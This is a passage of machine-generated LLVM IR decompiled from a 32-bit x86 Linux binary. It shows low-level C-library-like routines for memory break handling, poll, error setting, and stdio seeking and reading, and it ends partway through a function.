define i32 @function_8050c48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050c48:
  %v1_8050c56 = add i32 %arg2, -1
  %v1_8050c59 = urem i32 %v1_8050c56, 32
  %v2_8050c59 = icmp eq i32 %v1_8050c59, 0
  %v2_8050c5c = udiv i32 %v1_8050c56, 32
  br i1 %v2_8050c59, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8050c48
  %v4_8050c5f = shl i32 -2, %v1_8050c59
  %v5_8050c5f = sub nsw i32 32, %v1_8050c59
  %v6_8050c5f = lshr i32 -2, %v5_8050c5f
  %v7_8050c5f = or i32 %v6_8050c5f, %v4_8050c5f
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8050c48, %bb
  %v6_8050c61 = phi i32 [ -2, %dec_label_pc_8050c48 ], [ %v7_8050c5f, %bb ]
  %v2_8050c61 = mul nuw nsw i32 %v2_8050c5c, 4
  %v3_8050c61 = add i32 %v2_8050c61, %arg1
  %v4_8050c61 = inttoptr i32 %v3_8050c61 to i32*
  %v5_8050c61 = load i32, i32* %v4_8050c61, align 4
  %v7_8050c61 = and i32 %v5_8050c61, %v6_8050c61
  store i32 %v7_8050c61, i32* %v4_8050c61, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8050c59, { 1, 2, 0 }
  uselistorder i32 -2, { 4, 6, 5, 3, 7, 0, 17, 18, 2, 14, 15, 16, 20, 1, 8, 9, 10, 19, 11, 12, 13 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8050c68() local_unnamed_addr {
dec_label_pc_8050c68:
  %v0_8050c68 = load i32, i32* @eax, align 4
  %v1_8050c68 = add i32 %v0_8050c68, 28
  %v2_8050c68 = inttoptr i32 %v1_8050c68 to i32*
  %v3_8050c68 = load i32, i32* %v2_8050c68, align 4
  store i32 %v3_8050c68, i32* @global_var_80586dc.206, align 4
  %v1_8050c71 = add i32 %v0_8050c68, 44
  %v2_8050c71 = inttoptr i32 %v1_8050c71 to i32*
  %v3_8050c71 = load i32, i32* %v2_8050c71, align 4
  store i32 %v3_8050c71, i32* @global_var_80586e0.207, align 32
  ret i32 %v3_8050c71
}

define i32 @function_8050c7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050c7c:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050c7c = load i32, i32* @ebx, align 4
  store i32 %v0_8050c7c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8050c8f = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8050c8f, i32* @global_var_80580e4.184, align 4
  %v7_8050c9a = icmp ult i32 %v1_8050c8f, %arg1
  %v1_8050c9c = icmp eq i1 %v7_8050c9a, false
  br i1 %v1_8050c9c, label %dec_label_pc_8050cac, label %dec_label_pc_8050c9e

dec_label_pc_8050c9e:                             ; preds = %dec_label_pc_8050c7c
  %v0_8050c9e = load i32, i32* %stack_var_-4, align 4
  %v1_8050c9e = call i32 @function_804b4bc(i32 %v0_8050c9e)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8050ca6 = inttoptr i32 %v1_8050c9e to i32*
  store i32 12, i32* %v1_8050ca6, align 4
  %v0_8050cac.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050cac

dec_label_pc_8050cac:                             ; preds = %dec_label_pc_8050c7c, %dec_label_pc_8050c9e
  %v0_8050cac = phi i32 [ 0, %dec_label_pc_8050c7c ], [ %v0_8050cac.pre, %dec_label_pc_8050c9e ]
  %v2_8050cb0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050cb0, i32* @ebx, align 4
  ret i32 %v0_8050cac

; uselistorder directives
  uselistorder i32 %v1_8050c8f, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_80580e4.184, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050cac, { 1, 0 }
}

define i32 @function_8050cb4() local_unnamed_addr {
dec_label_pc_8050cb4:
  %v0_8050cb7 = load i32, i32* @eax, align 4
  %v1_8050cb9 = sub i32 0, %v0_8050cb7
  %v1_8050cbb = call i32 @function_804b4bc(i32 ptrtoint (i32* @0 to i32))
  %v2_8050cc0 = inttoptr i32 %v1_8050cbb to i32*
  store i32 %v1_8050cb9, i32* %v2_8050cc0, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 3, 4, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
}

define i32 @function_8050ccc() local_unnamed_addr {
dec_label_pc_8050ccc:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8050ccc = load i32, i32* @edi, align 4
  store i32 %v0_8050ccc, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_8050cdc = load i32, i32* @ebx, align 4
  %v1_8050cdd = inttoptr i32 %tmp4 to %pollfd*
  %v5_8050ce4 = call i32 @poll(%pollfd* %v1_8050cdd, i32 %tmp3, i32 %tmp)
  store i32 %v0_8050cdc, i32* @ebx, align 4
  store i32 %v5_8050ce4, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_8050ce4, -4095
  br i1 %tmp10, label %dec_label_pc_8050cfc, label %dec_label_pc_8050cf0

dec_label_pc_8050cf0:                             ; preds = %dec_label_pc_8050ccc
  %v1_8050cf0 = call i32 @function_804b4bc(i32 %v0_8050cdc)
  %v0_8050cf5 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050cf5 = sub i32 0, %v0_8050cf5
  %v2_8050cf7 = inttoptr i32 %v1_8050cf0 to i32*
  store i32 %v1_8050cf5, i32* %v2_8050cf7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050cfc

dec_label_pc_8050cfc:                             ; preds = %dec_label_pc_8050ccc, %dec_label_pc_8050cf0
  %v0_8050cfc = phi i32 [ %v5_8050ce4, %dec_label_pc_8050ccc ], [ -1, %dec_label_pc_8050cf0 ]
  %v2_8050d00 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050d00, i32* @edi, align 4
  ret i32 %v0_8050cfc

; uselistorder directives
  uselistorder i32 %v5_8050ce4, { 1, 0, 2 }
  uselistorder i32 %v0_8050cdc, { 1, 0 }
  uselistorder label %dec_label_pc_8050cfc, { 1, 0 }
}

define i32 @function_8050d04(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050d04:
  %v1_8050d0f = ashr i32 %arg2, 31
  %v4_8050d16 = inttoptr i32 %arg1 to i16*
  %v5_8050d16 = call i32 @function_8050d20(i16* %v4_8050d16, i32 %arg2, i32 %v1_8050d0f, i32 %arg3)
  ret i32 %v5_8050d16
}

define i32 @function_8050d20(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050d20:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8050d20 = load i32, i32* @ebp, align 4
  %v0_8050d21 = load i32, i32* @edi, align 4
  %v0_8050d22 = load i32, i32* @esi, align 4
  %v0_8050d23 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_8050d33 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8050d33, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp28 = icmp ult i32 %arg4, 3
  br i1 %tmp28, label %dec_label_pc_8050d57, label %dec_label_pc_8050d44

dec_label_pc_8050d44:                             ; preds = %dec_label_pc_8050d20
  %v1_8050d44 = call i32 @function_804b4bc(i32 %arg2)
  store i32 %v1_8050d44, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_8050d4c = inttoptr i32 %v1_8050d44 to i32*
  store i32 22, i32* %v1_8050d4c, align 4
  br label %dec_label_pc_8050df9

dec_label_pc_8050d57:                             ; preds = %dec_label_pc_8050d20
  %v1_8050d57 = add i32 %v4_8050d33, 52
  %v2_8050d57 = inttoptr i32 %v1_8050d57 to i32*
  %v3_8050d57 = load i32, i32* %v2_8050d57, align 4
  %v1_8050d5a = icmp eq i32 %v3_8050d57, 0
  %v1_8050d5c = icmp eq i1 %v1_8050d5a, false
  br i1 %v1_8050d5c, label %dec_label_pc_8050d7d, label %dec_label_pc_8050d5e

dec_label_pc_8050d5e:                             ; preds = %dec_label_pc_8050d57
  %v1_8050d5e = add i32 %v4_8050d33, 56
  store i32 %v1_8050d5e, i32* @ebx, align 4
  %v2_8050d68 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8050d68, i32* @eax, align 4
  %v3_8050d6d = call i32 @function_804ec6e(i32 %v2_8050d68, i32 134540395)
  store i32 %v3_8050d6d, i32* %eax.global-to-local, align 4
  %v0_8050d72 = load i32, i32* @ebx, align 4
  %v2_8050d75 = call i32 @function_804ec6b(i32 %v0_8050d72)
  store i32 %v2_8050d75, i32* %eax.global-to-local, align 4
  %v0_8050d7d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050d7d

dec_label_pc_8050d7d:                             ; preds = %dec_label_pc_8050d57, %dec_label_pc_8050d5e
  %v0_8050d85 = phi i32 [ %v4_8050d33, %dec_label_pc_8050d57 ], [ %v0_8050d7d.pre, %dec_label_pc_8050d5e ]
  %v1_8050d7d = inttoptr i32 %v0_8050d85 to i8*
  %v2_8050d7d = load i8, i8* %v1_8050d7d, align 1
  %v3_8050d7d = and i8 %v2_8050d7d, 64
  %v4_8050d7d = icmp eq i8 %v3_8050d7d, 0
  br i1 %v4_8050d7d, label %dec_label_pc_8050d92, label %dec_label_pc_8050d82

dec_label_pc_8050d82:                             ; preds = %dec_label_pc_8050d7d
  %v2_8050d86 = call i32 @function_804bcc0(i32 %v0_8050d85)
  store i32 %v2_8050d86, i32* %eax.global-to-local, align 4
  %v1_8050d8e = icmp eq i32 %v2_8050d86, 0
  %v1_8050d90 = icmp eq i1 %v1_8050d8e, false
  br i1 %v1_8050d90, label %dec_label_pc_8050de1, label %dec_label_pc_8050d92

dec_label_pc_8050d92:                             ; preds = %dec_label_pc_8050d82, %dec_label_pc_8050d7d
  %v0_8050d92 = load i32, i32* @edi, align 4
  %v9_8050d92 = icmp eq i32 %v0_8050d92, 1
  %v1_8050d95 = icmp eq i1 %v9_8050d92, false
  br i1 %v1_8050d95, label %dec_label_pc_8050d92.dec_label_pc_8050dab_crit_edge, label %dec_label_pc_8050d97

dec_label_pc_8050d92.dec_label_pc_8050dab_crit_edge: ; preds = %dec_label_pc_8050d92
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8050dab

dec_label_pc_8050d97:                             ; preds = %dec_label_pc_8050d92
  %v0_8050d97 = load i32, i32* @ecx, align 4
  %v2_8050d99 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8050d99, i32* %eax.global-to-local, align 4
  %v0_8050d9e = load i32, i32* @esi, align 4
  %tmp26 = inttoptr i32 %v0_8050d9e to i32*
  %v6_8050d9f = call i32 @function_8050e48(i32* %tmp26, i32 %v2_8050d99, i32 %v0_8050d97, i32 %v0_8050d97)
  store i32 %v6_8050d9f, i32* %eax.global-to-local, align 4
  %v2_8050da7 = icmp slt i32 %v6_8050d9f, 0
  br i1 %v2_8050da7, label %dec_label_pc_8050de1, label %dec_label_pc_8050d97.dec_label_pc_8050dab_crit_edge

dec_label_pc_8050d97.dec_label_pc_8050dab_crit_edge: ; preds = %dec_label_pc_8050d97
  %v0_8050dac.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050dab

dec_label_pc_8050dab:                             ; preds = %dec_label_pc_8050d92.dec_label_pc_8050dab_crit_edge, %dec_label_pc_8050d97.dec_label_pc_8050dab_crit_edge
  %v2_8050dad.pre-phi = phi i32 [ %.pre6, %dec_label_pc_8050d92.dec_label_pc_8050dab_crit_edge ], [ %v2_8050d99, %dec_label_pc_8050d97.dec_label_pc_8050dab_crit_edge ]
  %v0_8050dac = phi i32 [ %v0_8050d92, %dec_label_pc_8050d92.dec_label_pc_8050dab_crit_edge ], [ %v0_8050dac.pre, %dec_label_pc_8050d97.dec_label_pc_8050dab_crit_edge ]
  %v0_8050dab = load i32, i32* @edx, align 4
  store i32 %v2_8050dad.pre-phi, i32* %eax.global-to-local, align 4
  %v0_8050db2 = load i32, i32* @esi, align 4
  %v5_8050db3 = inttoptr i32 %v2_8050dad.pre-phi to i32*
  %v6_8050db3 = call i32 @function_8050f80(i32 %v0_8050db2, i32* %v5_8050db3, i32 %v0_8050dac, i32 %v0_8050dab)
  store i32 %v6_8050db3, i32* %eax.global-to-local, align 4
  %v2_8050dbb = icmp slt i32 %v6_8050db3, 0
  br i1 %v2_8050dbb, label %dec_label_pc_8050de1, label %dec_label_pc_8050dbf

dec_label_pc_8050dbf:                             ; preds = %dec_label_pc_8050dab
  %v0_8050dbf = load i32, i32* @esi, align 4
  %v1_8050dbf = inttoptr i32 %v0_8050dbf to i16*
  %v2_8050dbf = load i16, i16* %v1_8050dbf, align 2
  %v3_8050dbf = and i16 %v2_8050dbf, -72
  store i16 %v3_8050dbf, i16* %v1_8050dbf, align 2
  %v0_8050dc3 = load i32, i32* @esi, align 4
  %v1_8050dc3 = add i32 %v0_8050dc3, 8
  %v2_8050dc3 = inttoptr i32 %v1_8050dc3 to i32*
  %v3_8050dc3 = load i32, i32* %v2_8050dc3, align 4
  store i32 %v3_8050dc3, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_8050dc8 = add i32 %v0_8050dc3, 16
  %v3_8050dc8 = inttoptr i32 %v2_8050dc8 to i32*
  store i32 %v3_8050dc3, i32* %v3_8050dc8, align 4
  %v0_8050dcb = load i32, i32* %eax.global-to-local, align 4
  %v1_8050dcb = load i32, i32* @esi, align 4
  %v2_8050dcb = add i32 %v1_8050dcb, 20
  %v3_8050dcb = inttoptr i32 %v2_8050dcb to i32*
  store i32 %v0_8050dcb, i32* %v3_8050dcb, align 4
  %v0_8050dce = load i32, i32* %eax.global-to-local, align 4
  %v1_8050dce = load i32, i32* @esi, align 4
  %v2_8050dce = add i32 %v1_8050dce, 24
  %v3_8050dce = inttoptr i32 %v2_8050dce to i32*
  store i32 %v0_8050dce, i32* %v3_8050dce, align 4
  %v0_8050dd1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050dd1 = load i32, i32* @esi, align 4
  %v2_8050dd1 = add i32 %v1_8050dd1, 28
  %v3_8050dd1 = inttoptr i32 %v2_8050dd1 to i32*
  store i32 %v0_8050dd1, i32* %v3_8050dd1, align 4
  %v0_8050dd4 = load i32, i32* @esi, align 4
  %v1_8050dd4 = add i32 %v0_8050dd4, 44
  %v2_8050dd4 = inttoptr i32 %v1_8050dd4 to i32*
  store i32 0, i32* %v2_8050dd4, align 4
  %v0_8050ddb = load i32, i32* @esi, align 4
  %v1_8050ddb = add i32 %v0_8050ddb, 2
  %v2_8050ddb = inttoptr i32 %v1_8050ddb to i8*
  store i8 0, i8* %v2_8050ddb, align 1
  br label %dec_label_pc_8050de4

dec_label_pc_8050de1:                             ; preds = %dec_label_pc_8050dab, %dec_label_pc_8050d97, %dec_label_pc_8050d82
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050de4

dec_label_pc_8050de4:                             ; preds = %dec_label_pc_8050dbf, %dec_label_pc_8050de1
  br i1 %v1_8050d5c, label %dec_label_pc_8050df9, label %dec_label_pc_8050de8

dec_label_pc_8050de8:                             ; preds = %dec_label_pc_8050de4
  %v2_8050dec = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8050dec, i32* @eax, align 4
  %v3_8050df1 = call i32 @function_804ec6e(i32 %v2_8050dec, i32 1)
  store i32 %v3_8050df1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050df9

dec_label_pc_8050df9:                             ; preds = %dec_label_pc_8050de4, %dec_label_pc_8050d44, %dec_label_pc_8050de8
  %v0_8050dfc = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050dfc, i32* %eax.global-to-local, align 4
  store i32 %v0_8050d23, i32* @ebx, align 4
  store i32 %v0_8050d22, i32* @esi, align 4
  store i32 %v0_8050d21, i32* @edi, align 4
  store i32 %v0_8050d20, i32* @ebp, align 4
  ret i32 %v0_8050dfc

; uselistorder directives
  uselistorder i32 %v2_8050dad.pre-phi, { 1, 0 }
  uselistorder i32 %v0_8050d92, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32)* @function_804ec6b, { 8, 28, 27, 7, 6, 5, 26, 25, 3, 29, 35, 34, 11, 2, 1, 0, 10, 9, 24, 22, 21, 20, 19, 18, 23, 17, 33, 4, 16, 15, 32, 31, 30, 14, 13, 12 }
  uselistorder i32 (i32, i32)* @function_804ec6e, { 9, 8, 49, 48, 47, 46, 7, 6, 5, 4, 3, 2, 45, 44, 43, 42, 1, 0, 51, 50, 63, 62, 61, 60, 15, 14, 13, 12, 11, 10, 41, 40, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 39, 38, 27, 26, 59, 58, 25, 24, 23, 22, 57, 56, 55, 54, 53, 52, 21, 20, 19, 18, 17, 16 }
  uselistorder i32 134540395, { 2, 3, 29, 30, 31, 32, 33, 34, 0, 19, 4, 5, 6, 7, 8, 9, 10, 1, 20, 21, 22, 11, 12, 13, 14, 15, 16, 23, 24, 25, 26, 17, 27, 28, 18 }
  uselistorder i32 52, { 16, 1, 8, 0, 4, 5, 6, 14, 15, 9, 11, 7, 17, 18, 12, 13, 3, 2, 10 }
  uselistorder i32 22, { 9, 12, 8, 0, 1, 2, 3, 6, 10, 11, 7, 4, 5 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050df9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050de4, { 1, 0 }
  uselistorder label %dec_label_pc_8050dab, { 1, 0 }
  uselistorder label %dec_label_pc_8050d7d, { 1, 0 }
}

define i32 @function_8050e04(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050e04:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050e04 = load i32, i32* @ebx, align 4
  store i32 %v0_8050e04, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_8050e0a = ptrtoint i16* %arg1 to i32
  store i32 %v4_8050e0a, i32* @ebx, align 4
  %v1_8050e12 = bitcast i16* %arg1 to i8*
  %v2_8050e12 = load i8, i8* %v1_8050e12, align 1
  %v3_8050e12 = and i8 %v2_8050e12, 4
  %v4_8050e12 = icmp eq i8 %v3_8050e12, 0
  %v1_8050e15 = icmp eq i1 %v4_8050e12, false
  br i1 %v1_8050e15, label %dec_label_pc_8050e44, label %dec_label_pc_8050e17

dec_label_pc_8050e17:                             ; preds = %dec_label_pc_8050e04
  %v2_8050e17 = icmp slt i32 %arg3, 0
  %v1_8050e19 = icmp eq i1 %v2_8050e17, false
  br i1 %v1_8050e19, label %dec_label_pc_8050e20, label %dec_label_pc_8050e1b

dec_label_pc_8050e1b:                             ; preds = %dec_label_pc_8050e17
  br label %dec_label_pc_8050e20

dec_label_pc_8050e20:                             ; preds = %dec_label_pc_8050e17, %dec_label_pc_8050e1b
  %v0_8050e21 = phi i32 [ %arg3, %dec_label_pc_8050e17 ], [ 2147483647, %dec_label_pc_8050e1b ]
  %v1_8050e26 = add i32 %v4_8050e0a, 4
  %v2_8050e26 = inttoptr i32 %v1_8050e26 to i32*
  %v3_8050e26 = load i32, i32* %v2_8050e26, align 4
  %v4_8050e29 = inttoptr i32 %arg2 to i32*
  %v5_8050e29 = call i32 @function_8051bfc(i32 %v3_8050e26, i32* %v4_8050e29, i32 %v0_8050e21, i32 0)
  store i32 %v5_8050e29, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v5_8050e29, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_8050e44, label %dec_label_pc_8050e36

dec_label_pc_8050e36:                             ; preds = %dec_label_pc_8050e20
  %v1_8050e31 = icmp eq i32 %v5_8050e29, 0
  %v4_8050e34 = icmp eq i1 %v1_8050e31, false
  %v0_8050e3e = load i32, i32* @ebx, align 4
  %v1_8050e3e = inttoptr i32 %v0_8050e3e to i16*
  %v2_8050e3e = load i16, i16* %v1_8050e3e, align 2
  br i1 %v4_8050e34, label %dec_label_pc_8050e3e, label %dec_label_pc_8050e38

dec_label_pc_8050e38:                             ; preds = %dec_label_pc_8050e36
  %v3_8050e38 = or i16 %v2_8050e3e, 4
  store i16 %v3_8050e38, i16* %v1_8050e3e, align 2
  %v0_8050e47.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050e44

dec_label_pc_8050e3e:                             ; preds = %dec_label_pc_8050e36
  %v3_8050e3e = or i16 %v2_8050e3e, 8
  store i16 %v3_8050e3e, i16* %v1_8050e3e, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050e44

dec_label_pc_8050e44:                             ; preds = %dec_label_pc_8050e20, %dec_label_pc_8050e04, %dec_label_pc_8050e38, %dec_label_pc_8050e3e
  %v0_8050e47 = phi i32 [ %v5_8050e29, %dec_label_pc_8050e20 ], [ 0, %dec_label_pc_8050e04 ], [ %v0_8050e47.pre, %dec_label_pc_8050e38 ], [ 0, %dec_label_pc_8050e3e ]
  %v2_8050e46 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050e46, i32* @ebx, align 4
  ret i32 %v0_8050e47

; uselistorder directives
  uselistorder i16 %v2_8050e3e, { 1, 0 }
  uselistorder i32 %v5_8050e29, { 1, 2, 0, 3 }
  uselistorder i16 4, { 1, 0 }
  uselistorder i32 2147483647, { 0, 2, 1, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050e44, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8050e20, { 1, 0 }
}

define i32 @function_8050e48(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050e48:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8050e58 = load i32, i32* %arg1, align 4
  store i32 %v2_8050e58, i32* %esi.global-to-local, align 4
  %v1_8050e5f = urem i32 %v2_8050e58, 4
  %v2_8050e5f = icmp eq i32 %v1_8050e5f, 0
  store i32 %v1_8050e5f, i32* %ecx.global-to-local, align 4
  br i1 %v2_8050e5f, label %dec_label_pc_8050e8e, label %dec_label_pc_8050e64

dec_label_pc_8050e64:                             ; preds = %dec_label_pc_8050e48
  %v1_8050e66 = add nsw i32 %v1_8050e5f, -1
  %v8_8050e66 = icmp eq i32 %v1_8050e66, 0
  store i32 %v1_8050e66, i32* @edx, align 4
  br i1 %v8_8050e66, label %dec_label_pc_8050e8e, label %dec_label_pc_8050e69

dec_label_pc_8050e69:                             ; preds = %dec_label_pc_8050e64
  %v3_8050e69 = and i32 %v2_8050e58, 2048
  %v4_8050e69 = icmp eq i32 %v3_8050e69, 0
  br i1 %v4_8050e69, label %dec_label_pc_8050e8e, label %dec_label_pc_8050e6e

dec_label_pc_8050e6e:                             ; preds = %dec_label_pc_8050e69
  %v6_8050e6e = sub nsw i32 1, %v1_8050e5f
  %v7_8050e6e = and i32 %v1_8050e66, %v6_8050e6e
  %v8_8050e6e = icmp slt i32 %v7_8050e6e, 0
  %v9_8050e6e = icmp eq i32 %v1_8050e5f, 2
  %v10_8050e6e = icmp ult i32 %v1_8050e5f, 2
  %v3_8050e71 = icmp eq i1 %v10_8050e6e, %v8_8050e6e
  %v4_8050e71 = icmp eq i1 %v9_8050e6e, false
  %v5_8050e71 = and i1 %v4_8050e71, %v3_8050e71
  br i1 %v5_8050e71, label %dec_label_pc_8050ee4, label %dec_label_pc_8050e73

dec_label_pc_8050e73:                             ; preds = %dec_label_pc_8050e6e
  %v1_8050e73 = add i32 %tmp6, 40
  %v2_8050e73 = inttoptr i32 %v1_8050e73 to i32*
  %v3_8050e73 = load i32, i32* %v2_8050e73, align 4
  %v4_8050e73 = icmp eq i32 %v3_8050e73, 0
  %v1_8050e77 = icmp eq i1 %v4_8050e73, false
  br i1 %v1_8050e77, label %dec_label_pc_8050ee4, label %dec_label_pc_8050e79

dec_label_pc_8050e79:                             ; preds = %dec_label_pc_8050e73
  %v1_8050e79 = add i32 %tmp6, 3
  %v2_8050e79 = inttoptr i32 %v1_8050e79 to i8*
  %v3_8050e79 = load i8, i8* %v2_8050e79, align 1
  %v4_8050e79 = zext i8 %v3_8050e79 to i32
  %v2_8050e7d = sub nsw i32 %v1_8050e66, %v4_8050e79
  %v1_8050e7f = add i32 %tmp6, 44
  %v2_8050e7f = inttoptr i32 %v1_8050e7f to i32*
  %v3_8050e7f = load i32, i32* %v2_8050e7f, align 4
  %v1_8050e83 = add nsw i32 %v2_8050e7d, -1
  %tmp12 = icmp slt i32 %v3_8050e7f, 1
  br i1 %tmp12, label %dec_label_pc_8050e8e, label %dec_label_pc_8050e88

dec_label_pc_8050e88:                             ; preds = %dec_label_pc_8050e79
  %v1_8050e88 = add i32 %tmp6, 2
  %v2_8050e88 = inttoptr i32 %v1_8050e88 to i8*
  %v3_8050e88 = load i8, i8* %v2_8050e88, align 1
  %v4_8050e88 = zext i8 %v3_8050e88 to i32
  %v2_8050e8c = sub nsw i32 %v1_8050e83, %v4_8050e88
  br label %dec_label_pc_8050e8e

dec_label_pc_8050e8e:                             ; preds = %dec_label_pc_8050e79, %dec_label_pc_8050e69, %dec_label_pc_8050e64, %dec_label_pc_8050e48, %dec_label_pc_8050e88
  %v0_8050ea5 = phi i32 [ %v1_8050e83, %dec_label_pc_8050e79 ], [ %v1_8050e66, %dec_label_pc_8050e69 ], [ 0, %dec_label_pc_8050e64 ], [ 0, %dec_label_pc_8050e48 ], [ %v2_8050e8c, %dec_label_pc_8050e88 ]
  %v2_8050e8e = and i32 %v2_8050e58, 64
  %v3_8050e8e = icmp eq i32 %v2_8050e8e, 0
  %storemerge.in.in.v = select i1 %v3_8050e8e, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8050e9d = add i32 %tmp6, 16
  %v3_8050e9d = inttoptr i32 %v2_8050e9d to i32*
  %v4_8050e9d = load i32, i32* %v3_8050e9d, align 4
  %v5_8050e9d = sub i32 %storemerge, %v4_8050e9d
  %v1_8050ea0 = inttoptr i32 %arg2 to i32*
  %v2_8050ea0 = load i32, i32* %v1_8050ea0, align 4
  store i32 %v2_8050ea0, i32* %ecx.global-to-local, align 4
  %v1_8050ea2 = add i32 %arg2, 4
  %v2_8050ea2 = inttoptr i32 %v1_8050ea2 to i32*
  %v3_8050ea2 = load i32, i32* %v2_8050ea2, align 4
  store i32 %v3_8050ea2, i32* %ebx.global-to-local, align 4
  %v2_8050ea5 = add i32 %v5_8050e9d, %v0_8050ea5
  store i32 %v2_8050ea5, i32* %esi.global-to-local, align 4
  %v2_8050eb0 = ashr i32 %v2_8050ea5, 31
  %v5_8050eb9 = sub i32 %v2_8050ea0, %v2_8050ea5
  %v10_8050eb9 = icmp ult i32 %v2_8050ea0, %v2_8050ea5
  %v6_8050ebd = zext i1 %v10_8050eb9 to i32
  %tmp = icmp slt i32 %v2_8050ea5, 0
  %v2_8050eb0.neg = zext i1 %tmp to i32
  %v7_8050ebd = add i32 %v3_8050ea2, %v2_8050eb0.neg
  %v8_8050ebd = add i32 %v7_8050ebd, %v6_8050ebd
  store i32 %v8_8050ebd, i32* @edx, align 4
  store i32 %v5_8050eb9, i32* %v1_8050ea0, align 4
  %v0_8050ec3 = load i32, i32* @edx, align 4
  %v1_8050ec3 = load i32, i32* %edi.global-to-local, align 4
  %v2_8050ec3 = add i32 %v1_8050ec3, 4
  %v3_8050ec3 = inttoptr i32 %v2_8050ec3 to i32*
  store i32 %v0_8050ec3, i32* %v3_8050ec3, align 4
  %v0_8050ec6 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050ec6 = add i32 %v0_8050ec6, 4
  %v2_8050ec6 = inttoptr i32 %v1_8050ec6 to i32*
  %v3_8050ec6 = load i32, i32* %v2_8050ec6, align 4
  %v4_8050ec6 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8050ec9 = icmp slt i32 %v3_8050ec6, %v4_8050ec6
  br i1 %v5_8050ec9, label %dec_label_pc_8050ed3, label %dec_label_pc_8050ecb

dec_label_pc_8050ecb:                             ; preds = %dec_label_pc_8050e8e
